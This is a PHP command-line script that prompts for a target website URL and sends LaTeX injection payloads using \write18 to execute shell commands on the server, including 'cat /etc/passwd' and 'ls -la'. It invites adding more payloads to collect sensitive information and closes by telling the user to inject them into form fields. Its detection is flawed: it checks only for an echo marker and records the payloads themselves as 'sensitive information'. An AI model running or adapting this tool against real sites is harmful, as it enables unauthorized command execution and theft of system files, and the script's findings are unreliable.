<?php
// Function to check if a URL is vulnerable to LaTeX injection
function checkLaTeXInjection($url) {
    // Array of payloads for testing LaTeX injection
    $payloads = array(
        "\\documentclass{article}\n\\begin{document}\n\\write18{echo 'Vulnerable to LaTeX Injection!';}\n\\end{document}",
        "\\documentclass{article}\n\\begin{document}\n\\write18{cat /etc/passwd;}\n\\end{document}",
        "\\documentclass{article}\n\\begin{document}\n\\write18{ls -la;}\n\\end{document}"
        // Add more payloads as needed to collect sensitive information
    );

    // Initialize cURL session
    $ch = curl_init();
    
    // Initialize variable to store sensitive information found
    $sensitive_info = array();

    // Iterate through each payload
    foreach ($payloads as $payload) {
        // Log payload being tested
        echo "Testing payload:\n$payload\n";
        
        // Construct the request body
        $data = array(
            'text' => $payload
        );

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        // Execute the request
        $response = curl_exec($ch);
        
        // Check if the response contains sensitive information
        if (strpos($response, 'Vulnerable to LaTeX Injection!') !== false) {
            // Log successful payload
            echo "Payload successful:\n$payload\n";
            // Add payload to sensitive information array
            $sensitive_info[] = $payload;
        }
    }

    // Close cURL session
    curl_close($ch);

    // Return sensitive information found
    return $sensitive_info;
}

// Function to print colored output
function printColor($text, $color) {
    switch ($color) {
        case 'red':
            echo "\033[0;31m$text\033[0m";
            break;
        case 'green':
            echo "\033[0;32m$text\033[0m";
            break;
        case 'blue':
            echo "\033[0;34m$text\033[0m";
            break;
        default:
            echo $text;
    }
}

// Main program
echo "Enter your target website URL: ";
$target_url = trim(fgets(STDIN));

// Check if the URL is vulnerable to LaTeX injection and collect sensitive information
$sensitive_info = checkLaTeXInjection($target_url);

// Print the result
if (!empty($sensitive_info)) {
    printColor("The target website is vulnerable to LaTeX injection!\n", 'red');
    echo "Sensitive information found:\n";
    foreach ($sensitive_info as $info) {
        printColor($info . "\n", 'blue');
    }
    echo "\nTo test the vulnerability, try injecting the payloads above in a form field or URL parameter.\n";
} else {
    printColor("The target website is not vulnerable to LaTeX injection.\n", 'green');
}
?>
